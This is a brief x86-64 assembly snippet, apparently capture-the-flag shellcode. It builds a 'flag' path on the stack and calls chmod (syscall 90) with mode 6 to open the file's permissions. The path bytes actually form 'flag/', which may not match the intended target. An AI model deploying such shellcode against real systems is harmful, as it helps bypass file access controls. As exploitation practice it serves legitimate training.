.global _start
_start:
.intel_syntax noprefix
    push 0x67616c66
    mov BYTE PTR [rsp+4], 0x2f
    push rsp
    pop rdi 
    

    push 6
    pop rsi

    push 90
    pop rax
    syscall
